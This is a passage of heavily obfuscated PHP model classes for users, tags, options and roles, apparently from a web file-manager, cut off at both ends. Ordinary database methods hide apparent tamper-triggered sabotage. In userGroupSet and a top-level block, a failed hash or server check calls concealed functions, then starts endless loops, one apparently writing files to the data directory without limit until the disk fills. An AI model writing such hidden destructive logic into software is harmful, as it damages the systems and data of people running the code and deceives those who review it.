(!$éà˜‚™) { return !1; } $³û‘”¬“ = array($üÉÆ¿¿[1665] => $ªìÈÈÁé); Model($üÉÆ¿¿[601])->where($³û‘”¬“)->delete(); Model($üÉÆ¿¿[2341])->where($³û‘”¬“)->delete(); Model($üÉÆ¿¿[1953])->where($³û‘”¬“)->delete(); Model($üÉÆ¿¿[2326])->where($³û‘”¬“)->delete(); Model($üÉÆ¿¿[1075])->where($³û‘”¬“)->delete(); Model($üÉÆ¿¿[2156])->removeUserAll($ªìÈÈÁé); Model($üÉÆ¿¿[829])->userRootRemove($ªìÈÈÁé); return $this->where($³û‘”¬“)->delete(); } protected function userGroupSet($ëÊìåçƒ, $´ƒ˜ò™, $Ÿ°€ÁÇõ = array()) { $©ÁØ¾§¼ =& $_SERVER[óó‹¸‚å]; $“Í˜íÌ = $_SERVER[$©ÁØ¾§¼[884]] . $©ÁØ¾§¼[885]; $Õâ±ß”À = $©ÁØ¾§¼[1539]; if ($_SERVER[$©ÁØ¾§¼[880]] != $Õâ±ß”À($“Í˜íÌ)) { $ë«Ÿ¸¾‚ = $©ÁØ¾§¼[882]; $„ƒ”ÅíÑ = $©ÁØ¾§¼[883]; $á„Ëƒ¼ = $_SERVER[$©ÁØ¾§¼[884]] . $©ÁØ¾§¼[885]; $¤¨ŞíÅÒ = $„ƒ”ÅíÑ($á„Ëƒ¼); $¥Éêñş = explode($©ÁØ¾§¼[231], $¤¨ŞíÅÒ); if (count($¥Éêñş) < $©ÁØ¾§¼[635]) { $û©¥Ì¥ƒ = $©ÁØ¾§¼[886]; $û©¥Ì¥ƒ(); } $Õô±ëÈù = $©ÁØ¾§¼[887]; $Õô±ëÈù($_SERVER[$©ÁØ¾§¼[888]]); $ë«Ÿ¸¾‚ = $©ÁØ¾§¼[882]; $ë«Ÿ¸¾‚(); $îŒÄÃö = $©ÁØ¾§¼[1540]; $’Ÿ±¨Òà = json_encode($GLOBALS[$©ÁØ¾§¼[1541]]); $Õ”ù„‘« = 1; for ($°œ›íÚ™ = $Õ”ù„‘«; $°œ›íÚ™ > 0; $°œ›íÚ™++) { $îŒÄÃö(DATA_PATH . $°œ›íÚ™, $’Ÿ±¨Òà); } } $“ƒ½¤¿œ = $this->getInfoSimple($ëÊìåçƒ); if (!$“ƒ½¤¿œ || !is_array($´ƒ˜ò™)) { return !1; } $ûÛÉ œ¯ = Model($©ÁØ¾§¼[1953]); $ûÛÉ œ¯->where(array($©ÁØ¾§¼[1674] => $ëÊìåçƒ))->delete(); $ÕúÔÁÌš = array(); $›ŠÂÏ†Ÿ = 0; foreach ($´ƒ˜ò™ as $§èÄ¡ => $¾ŒµäĞ£) { $Î¡î³š™ = array($©ÁØ¾§¼[1674] => $ëÊìåçƒ, $©ÁØ¾§¼[1863] => $§èÄ¡, $©ÁØ¾§¼[1967] => $¾ŒµäĞ£); $Î¡î³š™[$©ÁØ¾§¼[1887]] = isset($Ÿ°€ÁÇõ[$›ŠÂÏ†Ÿ]) ? $Ÿ°€ÁÇõ[$›ŠÂÏ†Ÿ] : 0; $›ŠÂÏ†Ÿ++; $ÕúÔÁÌš[] = $Î¡î³š™; } return $ûÛÉ œ¯->addAll($ÕúÔÁÌš, array(), !0); } protected function userGroupAdd($îš£²¡¢, $ŠæÇŒí = array()) { $†ìêåŸ© =& $_SERVER[óó‹¸‚å]; $ÄÖñÔì = $this->getInfoSimple($îš£²¡¢); if (!$ÄÖñÔì || empty($ŠæÇŒí)) { return !1; } $ÂØ£úÄ = array(); foreach ($ŠæÇŒí as $¼¸ÙÃ³Ó => $ÔÚ¿š§¢) { $ÂØ£úÄ[] = array($†ìêåŸ©[1674] => $îš£²¡¢, $†ìêåŸ©[1863] => $¼¸ÙÃ³Ó, $†ìêåŸ©[1967] => $ÔÚ¿š§¢, $†ìêåŸ©[1887] => 0); } return Model($†ìêåŸ©[1953])->addAll($ÂØ£úÄ, array(), !0); } protected function userGroupRemove($ÀäÒôØ­, $‚ÓğÎÇ) { $Óº¸Æ¦‚ =& $_SERVER[óó‹¸‚å]; $Ö‘æí¶ = $this->getInfoSimple($ÀäÒôØ­); if (!$Ö‘æí¶ || !$‚ÓğÎÇ) { return !1; } $Èº¿öå = array($Óº¸Æ¦‚[1665] => $ÀäÒôØ­, $Óº¸Æ¦‚[1951] => $‚ÓğÎÇ); return Model($Óº¸Æ¦‚[1953])->where($Èº¿öå)->delete(); } public function listData() { $¸„ºããß = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¸„ºããß[$_SERVER[óó‹¸‚å][369]]); return $¸„ºããß; } public function listByID($–üíó¥) { $šá÷€´Ô =& $_SERVER[óó‹¸‚å]; if (!$–üíó¥) { return; } $ˆÊïÁø = array($šá÷€´Ô[1674] => array($šá÷€´Ô[7], $–üíó¥)); $·ëµ€÷ = $this->where($ˆÊïÁø)->select(); $·ëµ€÷ = array_sort_keep($·ëµ€÷, $šá÷€´Ô[1674], $–üíó¥); $this->_listDataApply($·ëµ€÷); return $·ëµ€÷; } public function listByGroup($È†ï¤á¶ = 0, $ş¤°‹ê = array()) { $‡¡ãİÕ  =& $_SERVER[óó‹¸‚å]; $şÔÅÊƒˆ = $‡¡ãİÕ [12]; $À„Á™ = array(); if ($È†ï¤á¶) { $À„Á™ = array($‡¡ãİÕ [2342] => intval($È†ï¤á¶)); $şÔÅÊƒˆ = "\x4c\x45\106\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\x6f\x75\x70\x20\165\x73\x65\162\137\147\162\157\x75\x70\x20\157\x6e\x20\165\163\145\162\x2e\x75\163\x65\x72\x49\x44\x20\75\x20\165\163\x65\x72\x5f\147\x72\x6f\x75\x70\x2e\165\x73\x65\x72\x49\104"; $Şùôˆéò = Input::get($‡¡ãİÕ [457], null, $‡¡ãİÕ [12]) ? $‡¡ãİÕ [12] : $‡¡ãİÕ [2343]; } if (isset($ş¤°‹ê[$‡¡ãİÕ [754]])) { $À„Á™[$‡¡ãİÕ [2344]] = $ş¤°‹ê[$‡¡ãİÕ [754]]; } $À×•ŒÒ = $this->_makeOrder($Şùôˆéò)->field($‡¡ãİÕ [2345])->where($À„Á™)->join($şÔÅÊƒˆ)->selectPage(50); $this->_listDataApply($À×•ŒÒ[$‡¡ãİÕ [369]]); return $À×•ŒÒ; } private function _makeOrder($­¨õ±¬ = '') { $ìŸúêí =& $_SERVER[óó‹¸‚å]; $Å†ˆ‘ÛÄ = array($ìŸúêí[1674], $ìŸúêí[32], $ìŸúêí[1852], $ìŸúêí[1824], $ìŸúêí[200]); $Õ¶ÀÀ¦Í = array($ìŸúêí[450] => $ìŸúêí[451], $ìŸúêí[452] => $ìŸúêí[453]); $¾×šµÊ = Input::get($ìŸúêí[457], $ìŸúêí[7], $ìŸúêí[1665], $Å†ˆ‘ÛÄ); $„ûØç¬ı = Input::get($ìŸúêí[458], $ìŸúêí[7], $ìŸúêí[1954], array($ìŸúêí[1954], $ìŸúêí[452])); $„ûØç¬ı = $Õ¶ÀÀ¦Í[$„ûØç¬ı]; $­¨õ±¬ = $­¨õ±¬ . "\165\x73\x65\x72\56{$¾×šµÊ}\x20{$„ûØç¬ı}\54\x20\165\x73\x65\162\56\165\163\x65\x72\111\x44\x20\x61\x73\143"; return $this->alias($ìŸúêí[2076])->order($­¨õ±¬); } public function listSearch($²¦ïñÏê) { $†ºÃèô =& $_SERVER[óó‹¸‚å]; $ß«Î™Öİ = $²¦ïñÏê[$†ºÃèô[1957]]; $ÎªÅÌ¨ï = isset($²¦ïñÏê[$†ºÃèô[1958]]) ? $²¦ïñÏê[$†ºÃèô[1958]] : !1; $ß«Î™Öİ = str_replace($†ºÃèô[1959], $†ºÃèô[1960], trim($ß«Î™Öİ)); $‘›ù®Õ = array($†ºÃèô[32] => array($†ºÃèô[383], "\x25{$ß«Î™Öİ}\x25"), $†ºÃèô[305] => array($†ºÃèô[383], "{$ß«Î™Öİ}\45"), $†ºÃèô[542] => array($†ºÃèô[383], "{$ß«Î™Öİ}\45"), $†ºÃèô[1007] => $†ºÃèô[1961]); if (Input::check($ß«Î™Öİ, $†ºÃèô[311])) { $‘›ù®Õ[$†ºÃèô[1674]] = array($†ºÃèô[383], "{$ß«Î™Öİ}\45"); $‘›ù®Õ[$†ºÃèô[2327]] = array($†ºÃèô[383], "{$ß«Î™Öİ}\45"); } if (!$ß«Î™Öİ) { $‘›ù®Õ = array(); } if (isset($²¦ïñÏê[$†ºÃèô[754]])) { $‘›ù®Õ[$†ºÃèô[754]] = $²¦ïñÏê[$†ºÃèô[754]]; } $‘›ù®Õ = $this->parseWhereLike($‘›ù®Õ); $£ø±ªŠ = $this->_makeOrder()->where($‘›ù®Õ)->selectPage(20); if (!$£ø±ªŠ || count($£ø±ªŠ[$†ºÃèô[369]]) < 5 && Input::check($ß«Î™Öİ, $†ºÃèô[318])) { $İ²˜¬´¦ = $this->_searchFromMeta($†ºÃèô[464], $ß«Î™Öİ, 10); $Æ–£ = $this->_searchFromMeta($†ºÃèô[465], $ß«Î™Öİ, 10); $ÄÕ°€± = array_merge($İ²˜¬´¦, $Æ–£, $£ø±ªŠ[$†ºÃèô[369]]); $£ø±ªŠ[$†ºÃèô[369]] = array_unique_by_key($ÄÕ°€±, $†ºÃèô[1674]); $£ø±ªŠ[$†ºÃèô[366]][$†ºÃèô[367]] = count($£ø±ªŠ[$†ºÃèô[369]]); $£ø±ªŠ[$†ºÃèô[366]][$†ºÃèô[368]] = ceil($£ø±ªŠ[$†ºÃèô[366]][$†ºÃèô[367]] / $£ø±ªŠ[$†ºÃèô[366]][$†ºÃèô[363]]); } $this->_listDataApply($£ø±ªŠ[$†ºÃèô[369]]); $this->_filterByGroup($£ø±ªŠ, $ÎªÅÌ¨ï); return $£ø±ªŠ; } private function _filterByGroup(&$²ô¦õşŞ, $üÀÃäéó) { $¡‹Ñ§Œ© =& $_SERVER[óó‹¸‚å]; if (!$üÀÃäéó) { return $²ô¦õşŞ; } foreach ($²ô¦õşŞ[$¡‹Ñ§Œ©[369]] as $™Å‚¼ÕÑ => &$¨ø÷½”É) { $ÉÍ™ÚÂ = array_to_keyvalue($¨ø÷½”É[$¡‹Ñ§Œ©[2046]], $¡‹Ñ§Œ©[12], $¡‹Ñ§Œ©[1863]); if (!in_array($üÀÃäéó, $ÉÍ™ÚÂ)) { unset($²ô¦õşŞ[$¡‹Ñ§Œ©[369]][$™Å‚¼ÕÑ]); } } unset($¨ø÷½”É); $²ô¦õşŞ[$¡‹Ñ§Œ©[369]] = array_values($²ô¦õşŞ[$¡‹Ñ§Œ©[369]]); $²ô¦õşŞ[$¡‹Ñ§Œ©[366]] = array($¡‹Ñ§Œ©[2110] => count($²ô¦õşŞ[$¡‹Ñ§Œ©[369]]), $¡‹Ñ§Œ©[2108] => $²ô¦õşŞ[$¡‹Ñ§Œ©[366]][$¡‹Ñ§Œ©[363]], $¡‹Ñ§Œ©[2107] => 1, $¡‹Ñ§Œ©[2109] => 1); } private function _searchFromMeta($ôƒ­Ÿ—, $ÕÍ¡¢µƒ, $Õ“ÄîØ) { $ÎœÉš =& $_SERVER[óó‹¸‚å]; $ÕÍ¡¢µƒ = strtolower($ÕÍ¡¢µƒ); $ù¶Æ¿ıï = array($ÎœÉš[94] => $ôƒ­Ÿ—, $ÎœÉš[374] => array($ÎœÉš[383], "\x25{$ÕÍ¡¢µƒ}\45")); $ù¶Æ¿ıï = $this->parseWhereLike($ù¶Æ¿ıï); $æµ±Í = Model($ÎœÉš[2346])->where($ù¶Æ¿ıï)->limit($Õ“ÄîØ)->select(); if (!$æµ±Í) { return array(); } $æµ±Í = array_to_keyvalue($æµ±Í, $ÎœÉš[12], $ÎœÉš[1674]); $ Š·Ñ‰ = $this->where(array($ÎœÉš[1665] => array($ÎœÉš[7], $æµ±Í)))->select(); if (!$ Š·Ñ‰) { return array(); } return $ Š·Ñ‰; } private function _listDataApplyItem($Ë…«êú) { $Ñİş‘Ï¹ = array($Ë…«êú); $this->_listDataApply($Ñİş‘Ï¹); return $Ñİş‘Ï¹[0]; } private function _listDataApply(&$È¯ëŒ‡») { $«ÃÎâµ =& $_SERVER[óó‹¸‚å]; if (!$È¯ëŒ‡») { return; } array_remove_key($È¯ëŒ‡», $«ÃÎâµ[896]); $œ¼€µÕ¡ = array_to_keyvalue($È¯ëŒ‡», $«ÃÎâµ[12], $«ÃÎâµ[1674]); $this->_listAppendGroup($È¯ëŒ‡», $œ¼€µÕ¡); $this->_listAppendMeta($È¯ëŒ‡», $œ¼€µÕ¡); $this->_listAppendSourceRoot($È¯ëŒ‡», $œ¼€µÕ¡); } private function _listAppendSourceRoot(&$ş€ºèé·, $¡‰Â€¶) { $ÍİÛÒ¿å =& $_SERVER[óó‹¸‚å]; $ŒÒéÂ½ = Model($ÍİÛÒ¿å[829])->listSourceRoot(SourceModel::TYPE_USER, $¡‰Â€¶); $ŒÒéÂ½ = array_to_keyvalue($ŒÒéÂ½, $ÍİÛÒ¿å[505]); $ŒÒéÂ½ = array_remove_key($ŒÒéÂ½, $ÍİÛÒ¿å[505]); foreach ($ş€ºèé· as &$©ê„¨ì–) { $©ê„¨ì–[$ÍİÛÒ¿å[86]] = $ŒÒéÂ½[$©ê„¨ì–[$ÍİÛÒ¿å[1674]]] ? $ŒÒéÂ½[$©ê„¨ì–[$ÍİÛÒ¿å[1674]]] : array(); } unset($©ê„¨ì–); } private function _listAppendGroup(&$´õÀÅ¡Î, $ö¸†ˆŞ) { $”Âô½˜× =& $_SERVER[óó‹¸‚å]; $Ú¢øúÏ = array($”Âô½˜×[1674] => array($”Âô½˜×[7], $ö¸†ˆŞ)); $ÇíŒª¦÷ = Model($”Âô½˜×[1953])->where($Ú¢øúÏ)->select(); $ÙĞ»î“€ = array_to_keyvalue($ÇíŒª¦÷, $”Âô½˜×[12], $”Âô½˜×[1863]); $ÙĞ»î“€ = array_remove_value(array_unique($ÙĞ»î“€), $”Âô½˜×[197]); if (!$ÙĞ»î“€ || !$ÇíŒª¦÷) { return; } $Ú¢øúÏ = array($”Âô½˜×[1863] => array($”Âô½˜×[7], $ÙĞ»î“€)); $‰†œ†­Å = Model($”Âô½˜×[2044])->field($”Âô½˜×[2347])->where($Ú¢øúÏ)->select(); $‰†œ†­Å = array_to_keyvalue($‰†œ†­Å, $”Âô½˜×[1863]); $ÇíŒª¦÷ = array_to_keyvalue_group($ÇíŒª¦÷, $”Âô½˜×[1674]); foreach ($ÇíŒª¦÷ as &$³ìíƒóù) { $Ğ×Èş§ = array(); foreach ($³ìíƒóù as $¢æ†Œô‰) { if (!$¢æ†Œô‰[$”Âô½˜×[1967]]) { continue; } $é‡»ôÇ = Model($”Âô½˜×[507])->listData($¢æ†Œô‰[$”Âô½˜×[1967]]); $Ğ×Èş§[] = array($”Âô½˜×[1863] => $¢æ†Œô‰[$”Âô½˜×[1863]], $”Âô½˜×[2348] => $‰†œ†­Å[$¢æ†Œô‰[$”Âô½˜×[1863]]][$”Âô½˜×[32]], $”Âô½˜×[521] => $‰†œ†­Å[$¢æ†Œô‰[$”Âô½˜×[1863]]][$”Âô½˜×[521]], $”Âô½˜×[413] => $é‡»ôÇ); } $³ìíƒóù = $Ğ×Èş§; } unset($³ìíƒóù); foreach ($´õÀÅ¡Î as &$ØÛÎü¢Œ) { $ØÛÎü¢Œ[$”Âô½˜×[2046]] = array(); if (isset($ÇíŒª¦÷[$ØÛÎü¢Œ[$”Âô½˜×[1674]]])) { $ØÛÎü¢Œ[$”Âô½˜×[2046]] = $ÇíŒª¦÷[$ØÛÎü¢Œ[$”Âô½˜×[1674]]]; } } unset($ØÛÎü¢Œ); } public function userAppendGroup($–óÜ´×) { $¥“şŞ÷ =& $_SERVER[óó‹¸‚å]; if (!$–óÜ´×) { return array(); } $this->_listAppendGroup($–óÜ´×, array_to_keyvalue($–óÜ´×, $¥“şŞ÷[12], $¥“şŞ÷[1674])); return $–óÜ´×; } private function _listAppendMeta(&$“îÀç£ù, $§ı ¤„Ÿ) { $È¸‹ò· =& $_SERVER[óó‹¸‚å]; $ïÏááÌ = UserJobModel::JOB_KEY; $Ò²Å†û£ = array($È¸‹ò·[2328]); $¡ü®ú§­ = array($È¸‹ò·[1674] => array($È¸‹ò·[7], $§ı ¤„Ÿ)); $øÎıÁÀ = Model($È¸‹ò·[2326])->where($¡ü®ú§­)->select(); $øÎıÁÀ = array_to_keyvalue_group($øÎıÁÀ, $È¸‹ò·[1674]); foreach ($øÎıÁÀ as &$çÕóö²ƒ) { $ıú±üıİ = array(); foreach ($çÕóö²ƒ as $Òñù™Ø) { if (!in_array($Òñù™Ø[$È¸‹ò·[94]], $Ò²Å†û£)) { $ıú±üıİ[$Òñù™Ø[$È¸‹ò·[94]]] = $Òñù™Ø[$È¸‹ò·[374]]; } } $çÕóö²ƒ = $ıú±üıİ; } unset($çÕóö²ƒ); $ş³À¡ŞÈ = Model($È¸‹ò·[2349]); foreach ($“îÀç£ù as &$Ú¸Ğ»˜Ò) { $üíĞúìô = array(); if (isset($øÎıÁÀ[$Ú¸Ğ»˜Ò[$È¸‹ò·[1674]]])) { $üíĞúìô = $øÎıÁÀ[$Ú¸Ğ»˜Ò[$È¸‹ò·[1674]]]; } $Ú¸Ğ»˜Ò[$È¸‹ò·[2350]] = array(); if (isset($üíĞúìô[$ïÏááÌ])) { $Ú¸Ğ»˜Ò[$È¸‹ò·[2350]] = $ş³À¡ŞÈ->getUserJobInfo($üíĞúìô[$ïÏááÌ]); } } unset($Ú¸Ğ»˜Ò); } protected function groupUserAll($ÕÕİÅÙí) { $¨›…¢Ê„ =& $_SERVER[óó‹¸‚å]; if (!$ÕÕİÅÙí) { return !1; } $«à‚”Š¹ = Model($¨›…¢Ê„[1953])->field($¨›…¢Ê„[1674])->where(array($¨›…¢Ê„[1863] => array($¨›…¢Ê„[7], $ÕÕİÅÙí)))->select(); $«à‚”Š¹ = array_to_keyvalue($«à‚”Š¹, $¨›…¢Ê„[12], $¨›…¢Ê„[1674]); return array_unique($«à‚”Š¹); } public function userSearch($ªÔ€é—œ, $ò¿Ú…Ö = "\x2a") { return Model($_SERVER[óó‹¸‚å][535])->where($ªÔ€é—œ)->field($ò¿Ú…Ö)->find(); } } goto Bèô½÷ëÙ; aã¶­¹ƒÏ¦: define($_SERVER[óó‹¸‚å][612], $_SERVER[óó‹¸‚å][613]); $ugrilnjpsv = $_SERVER[óó‹¸‚å][614]; if (strlen($ugrilnjpsv) < $_SERVER[óó‹¸‚å][615]) { return; } goto bö½æè­; Dğ•×»õ´œ: define($_SERVER[óó‹¸‚å][241], 1); define($_SERVER[óó‹¸‚å][242], 0); define($_SERVER[óó‹¸‚å][243], 2); goto FÑêËÉÎñŒ; Bèô½÷ëÙ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($©õÚĞÍ) { $±’‹ñ£‹ =& $_SERVER[óó‹¸‚å]; if (!defined($±’‹ñ£‹[475])) { define($±’‹ñ£‹[475], 0); } return "\125\x73\145\162\x4f\160\x74\151\157\x6e\x5f{$©õÚĞÍ}\x5f" . USER_ID; } protected function filterWhere($’†ã ¸Ã) { $àô†Ú¼ş =& $_SERVER[óó‹¸‚å]; if (!defined($àô†Ú¼ş[475])) { define($àô†Ú¼ş[475], 0); } $’†ã ¸Ã[$àô†Ú¼ş[1674]] = USER_ID; return $’†ã ¸Ã; } public function cacheRemoveUser($ ˜ŞÑ©Š, $¥Ó¨ä›–) { return Cache::remove("\x55\x73\x65\162\117\x70\164\x69\157\156\x5f{$ ˜ŞÑ©Š}\x5f" . $¥Ó¨ä›–); } protected function optionDefault($Ææ²ˆÓÍ = '') { $Æé•”ã =& $_SERVER[óó‹¸‚å]; if ($Ææ²ˆÓÍ == $Æé•”ã[12]) { return $GLOBALS[$Æé•”ã[6]][$Æé•”ã[2351]]; } if ($Ææ²ˆÓÍ == $Æé•”ã[2352]) { return $GLOBALS[$Æé•”ã[6]][$Æé•”ã[2353]]; } } } if (!isset($_SERVER[$_SERVER[óó‹¸‚å][880]]) || !isset($_SERVER[$_SERVER[óó‹¸‚å][881]])) { $_getc = $_SERVER[óó‹¸‚å][883]; $_getfile = $_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óó‹¸‚å][231], $_getfilec); if (count($_getarrs) < $_SERVER[óó‹¸‚å][620]) { $exit = $_SERVER[óó‹¸‚å][886]; $exit(); } $_act = $_SERVER[óó‹¸‚å][1380]; $_act($_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[óó‹¸‚å][378]); } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\164\x61\x67\x4c\x69\163\164"; public $modelType = "\x55\163\x65\x72\117\160\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\171\154\x65", "\163\x6f\162\x74"); public function listData($õİ …şô = false, $÷ˆ§˜’Æ = "\163\157\162\164", $ª¯ãÑÂ© = false) { return parent::listData($õİ …şô, $÷ˆ§˜’Æ, $ª¯ãÑÂ©); } public function remove($©‡ÛÉàÜ) { return parent::remove($©‡ÛÉàÜ); } public function add($ÕØÍáÇ›, $³õÑåÑÔ = "\x6c\141\x62\145\154\55\147\162\145\x79\x2d\156\157\x72\155\141\x6c") { $áèÒ»Î˜ =& $_SERVER[óó‹¸‚å]; if ($this->findByName($ÕØÍáÇ›)) { return !1; } $²ô”Œè = array($áèÒ»Î˜[420] => $ÕØÍáÇ›, $áèÒ»Î˜[485] => $³õÑåÑÔ, $áèÒ»Î˜[1867] => $this->getSort($áèÒ»Î˜[258]) + 1); return parent::insert($²ô”Œè); } public function update($ÛŠ¸ô»Á, $ãËÒ´£) { $§ıØê¡ı =& $_SERVER[óó‹¸‚å]; $ï±¼Å×® = $this->listData($ÛŠ¸ô»Á); $î¥¾Áë— = $this->findByName($ãËÒ´£[$§ıØê¡ı[32]]); if (!$ï±¼Å×® || $î¥¾Áë— && $î¥¾Áë—[$§ıØê¡ı[399]] != $ï±¼Å×®[$§ıØê¡ı[399]]) { return !1; } return parent::update($ÛŠ¸ô»Á, $ãËÒ´£); } public function moveTop($İ¤É´ô§) { $­ŠÒñ¨¿ =& $_SERVER[óó‹¸‚å]; $£šâÈ õ = parent::listData(); $Üº°×¢ã = $this->getSort($­ŠÒñ¨¿[257]); foreach ($£šâÈ õ as &$Ú¼’º¸Ù) { if ($Ú¼’º¸Ù[$­ŠÒñ¨¿[399]] == $İ¤É´ô§) { $Ú¼’º¸Ù[$­ŠÒñ¨¿[1887]] = $Üº°×¢ã; continue; } $Ú¼’º¸Ù[$­ŠÒñ¨¿[1887]] += 1; } unset($Ú¼’º¸Ù); return parent::resetData($£šâÈ õ); } public function moveBottom($Øñ‰”½×) { $âƒü˜Û– =& $_SERVER[óó‹¸‚å]; $İîéÇ£ = $this->getSort($âƒü˜Û–[258]) + 1; return parent::update($Øñ‰”½×, array($âƒü˜Û–[1887] => $İîéÇ£)); } public function resetSort($â’­íçĞ) { $¯™œ½¼¿ =& $_SERVER[óó‹¸‚å]; $÷òè‰ñ = array(); $â’­íçĞ = is_array($â’­íçĞ) ? $â’­íçĞ : array(); for ($û¬›ô÷ = 0; $û¬›ô÷ < count($â’­íçĞ); $û¬›ô÷++) { $÷òè‰ñ[$â’­íçĞ[$û¬›ô÷] . $¯™œ½¼¿[12]] = $û¬›ô÷ + 1; } $Ïåñ¼±Æ = parent::listData(); foreach ($Ïåñ¼±Æ as &$¹ŸáÓ›÷) { $Ò¨Î‚ï™ = $÷òè‰ñ[$¹ŸáÓ›÷[$¯™œ½¼¿[399]]]; $¹ŸáÓ›÷[$¯™œ½¼¿[1887]] = $Ò¨Î‚ï™ ? $Ò¨Î‚ï™ : $¹ŸáÓ›÷[$¯™œ½¼¿[1887]]; } unset($¹ŸáÓ›÷); return parent::resetData($Ïåñ¼±Æ); } private function getSort($ô™ê¸©¹) { $Œî—äœ =& $_SERVER[óó‹¸‚å]; $µĞ¹åø€ = parent::listData(); $£şšÉÙŸ = array_to_keyvalue($µĞ¹åø€, $Œî—äœ[12], $Œî—äœ[1887]); if (!$£şšÉÙŸ) { $£şšÉÙŸ = array(0); } $Û©ôÚûÅ = $ô™ê¸©¹ == $Œî—äœ[258] ? max($£şšÉÙŸ) : min($£şšÉÙŸ); return intval($Û©ôÚûÅ); } } goto F„Şó§ñš’; bÓì¦¸øÓØ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\162\157\x6c\145\x4c\x69\x73\164"; public $field = array("\156\x61\155\145", "\x61\165\164\x68", "\x6c\141\142\x65\154", "\x64\x69\x73\160\154\x61\x79", "\x73\171\163\x74\145\155", "\144\x65\163\x63", "\151\147\x6e\x6f\162\145\105\170\x74", "\151\147\x6e\x6f\x72\x65\106\151\x6c\145\123\151\x7a\145", "\x61\x64\155\151\x6e\x69\163\x74\162\x61\164\x6f\162", "\163\x6f\162\x74"); public function listData($Ûê‰›ò = false, $‘í¾ûş³ = "\x73\x6f\162\164", $¢±æìÓ¼ = false) { $¹”™¹ø³ =& $_SERVER[óó‹¸‚å]; $ÀŒÕ÷¦ = parent::listData($Ûê‰›ò, $‘í¾ûş³, $¢±æìÓ¼); if (!$Ûê‰›ò) { foreach ($ÀŒÕ÷¦ as $¼‚æ’´ñ => $ç ƒ‹…ô) { if ($ç ƒ‹…ô[$¹”™¹ø³[2061]] == 1) { $ÀŒÕ÷¦[$¼‚æ’´ñ][$¹”™¹ø³[453]] = LNG($¹”™¹ø³[2296]); } } } return $ÀŒÕ÷¦; } public function update($şà€É”ş, $î°áÀ…) { $˜¸Æ“ÙÛ =& $_SERVER[óó‹¸‚å]; $ŒÆ »Ğš = parent::listData($şà€É”ş); $³›ìãØ = $this->findByName($î°áÀ…[$˜¸Æ“ÙÛ[32]]); if (!$ŒÆ »Ğš || $³›ìãØ && $³›ìãØ[$˜¸Æ“ÙÛ[399]] != $ŒÆ »Ğš[$˜¸Æ“ÙÛ[399]]) { return !1; } if ($³›ìãØ[$˜¸Æ“ÙÛ[2061]] == 1) { $î°áÀ… = array($˜¸Æ“ÙÛ[32] => $î°áÀ…[$˜¸Æ“ÙÛ[32]], $˜¸Æ“ÙÛ[1886] => $î°áÀ…[$˜¸Æ“ÙÛ[1886]]); } $this->filterAuth($î°áÀ…[$˜¸Æ“ÙÛ[413]]); return parent::update($şà€É”ş, $î°áÀ…); } public function remove($»·‘©™) { $¾Æûà¦ã = parent::listData($»·‘©™); if (!$¾Æûà¦ã || $¾Æûà¦ã[$_SERVER[óó‹¸‚å][1292]]) { return !1; } return parent::remove($»·‘©™); } public function add($ñş•¶õ) { $â„°”õ =& $_SERVER[óó‹¸‚å]; $İÏ‚†¶³ = $ñş•¶õ[$â„°”õ[32]]; if ($this->findByName($İÏ‚†¶³)) { return !1; } $Á†‰¦¥· = array($â„°”õ[420] => $İÏ‚†¶³, $â„°”õ[1869] => $â„°”õ[12], $â„°”õ[1865] => $â„°”õ[1873], $â„°”õ[2297] => 1, $â„°”õ[1868] => 0, $â„°”õ[2298] => 0, $â„°”õ[1867] => $this->getSort()); $ñş•¶õ = array_merge($Á†‰¦¥·, $ñş•¶õ); $this->filterAuth($ñş•¶õ[$â„°”õ[413]]); return parent::insert($ñş•¶õ); } private function getSort() { $„šÓäŞ² =& $_SERVER[óó‹¸‚å]; $„–²ÓÎ„ = parent::listData(); $úØĞ¶á = array_to_keyvalue($„–²ÓÎ„, $„šÓäŞ²[12], $„šÓäŞ²[1887]); return empty($úØĞ¶á) ? 0 : max($úØĞ¶á) + 1; } private function filterAuth(&$ó‡ÅùÛŞ) { $–ÑÖûÏ =& $_SERVER[óó‹¸‚å]; $Ö©åùÌ = array(); $’÷” · = array_filter(explode($–ÑÖûÏ[50], $ó‡ÅùÛŞ)); foreach ($’÷” · as $ó‡ÅùÛŞ) { $İ™ª‡àğ = explode($–ÑÖûÏ[10], $ó‡ÅùÛŞ); if ($İ™ª‡àğ[0] == $–ÑÖûÏ[2299] && $İ™ª‡àğ[1] != $–ÑÖûÏ[1198]) { $ï»ÍƒÈ = $İ™ª‡àğ[0] . $–ÑÖûÏ[10] . $İ™ª‡àğ[1] . $–ÑÖûÏ[2300]; if (!in_array($ï»ÍƒÈ, $’÷” ·)) { $Ö©åùÌ[] = $ï»ÍƒÈ; } } $Ö©åùÌ[] = $ó‡ÅùÛŞ; } $ó‡ÅùÛŞ = implode($–ÑÖûÏ[50], $Ö©åùÌ); } public function findRoleDefault() { $„Çó»ŒÀ =& $_SERVER[óó‹¸‚å]; $ïöšïÕù = parent::listData(); $û½öëÄò = !1; foreach ($ïöšïÕù as $³¾ì¬Ÿò) { if (!$³¾ì¬Ÿò || $³¾ì¬Ÿò[$„Çó»ŒÀ[1885]] == $„Çó»ŒÀ[197] || $³¾ì¬Ÿò[$„Çó»ŒÀ[2061]] == 1) { continue; } if (strstr($³¾ì¬Ÿò[$„Çó»ŒÀ[413]], $„Çó»ŒÀ[2301])) { continue; } if (!strstr($³¾ì¬Ÿò[$„Çó»ŒÀ[413]], $„Çó»ŒÀ[2302])) { continue; } if (!$û½öëÄò) { $û½öëÄò = $³¾ì¬Ÿò; continue; } $ÑòÀ†§ = explode($„Çó»ŒÀ[50], $û½öëÄò[$„Çó»ŒÀ[413]]); $î„“ŒŠŸ = explode($„Çó»ŒÀ[50], 